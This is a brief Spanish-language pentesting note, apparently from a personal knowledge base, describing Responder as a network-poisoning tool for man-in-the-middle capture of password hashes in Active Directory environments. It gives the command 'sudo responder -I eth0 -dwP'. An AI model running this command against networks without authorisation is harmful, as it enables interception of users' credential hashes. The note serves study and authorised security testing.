
--------
#activeDirectory #poisoning #red #tool 

-----------

- Heramienta de envenenamiento de red para hacer un ataque estilo man-in-the-middle con el que vamos a poder capturar los hashes mientras se esten haciendo peticiones en el servidor


```bash
sudo responder -I eth0 -dwP 
```


![[Pasted image 20240426224851.png]]

